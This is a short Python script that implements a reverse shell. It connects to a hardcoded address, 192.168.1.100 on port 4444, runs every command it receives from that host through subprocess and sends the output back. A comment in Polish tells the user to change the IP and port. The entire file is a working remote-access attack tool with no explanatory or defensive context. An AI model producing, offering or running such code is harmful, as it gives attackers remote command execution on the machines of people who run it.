import socket
import subprocess

def reverse_shell(server_ip, server_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))

        while True:
            command = sock.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break

            output = subprocess.getoutput(command)
            sock.send(output.encode("utf-8"))
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()

# Zmień IP i port na odpowiednie
reverse_shell("192.168.1.100", 4444)
